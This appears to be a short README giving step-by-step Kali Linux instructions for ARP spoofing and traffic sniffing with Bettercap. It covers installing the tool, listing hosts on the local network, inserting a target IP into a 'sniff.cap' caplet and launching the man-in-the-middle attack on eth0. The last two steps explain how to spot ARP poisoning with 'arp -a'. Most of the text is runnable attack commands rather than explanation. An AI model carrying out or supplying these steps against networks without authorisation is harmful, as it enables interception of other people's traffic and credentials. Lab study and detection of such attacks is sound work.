# INSTRUCTIONS :

1. Open Kali Terminal and install Bettercap used for ARP spoofing.

2. To install Bettercap run (If already installed, go to step 3):

    ```bash
    sudo su
    apt-get install bettercap
    ```

3. Run Bettercap:

    ```bash
    bettercap
    ```

4. Now open the `sniff.cap` file, and replace `0.0.0.0` with the target IP address.

5. To know all the IPs of systems in your network:

    - Open another terminal  
    ```bash
    bettercap
    net.probe on
    ```
    - You can now see all IP addresses in your network.

6. Now run the command:

    ```bash
    bettercap -iface eth0 -caplet sniff.cap
    ```

7. To exit spoofing run:

    ```bash
    exit
    ```

8. After exiting, Bettercap automatically resets all fields to their default values (previous values).

9. To check whether ARP poisoning is happening in your network:

    - Open terminal (in Windows):
    ```bash
    arp -a
    ```

10. If any two IP addresses have the same MAC address, then ARP poisoning is being performed in your network.
